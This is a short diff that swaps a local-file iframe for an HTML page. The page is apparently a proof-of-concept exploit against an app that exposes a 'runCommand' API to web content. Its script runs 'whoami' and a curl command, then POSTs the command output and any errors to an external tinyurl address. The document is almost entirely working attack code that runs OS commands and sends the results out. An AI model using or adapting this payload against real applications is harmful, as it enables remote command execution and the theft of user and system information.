@@ -1,1 +1,27 @@
-<iframe src=filr:///Downloads/1328396.png></iframe>
+<!DOCTYPE html>
+<body>
+  <script>
+    // Check if the vulnerable API is exposed
+    if (window.api && window.api.runCommand) {
+      // Execute OS command and exfiltrate output
+      window.api.runCommand('whoami && curl https://tinyurl.com/yz885dsu/$(whoami)')
+        .then(output => {
+          // Optional: Send command output to your server
+          fetch('https://tinyurl.com/yz885dsu/result', {
+            method: 'POST',
+            body: output
+          });
+        })
+        .catch(error => {
+          fetch('https://tinyurl.com/yz885dsu/error', {
+            method: 'POST',
+            body: error.message
+          });
+        });
+    } else {
+      // Fallback: Alert the user (for demonstration)
+      alert('Vulnerable API not found!');
+    }
+  </script>
+</body>
+</html>
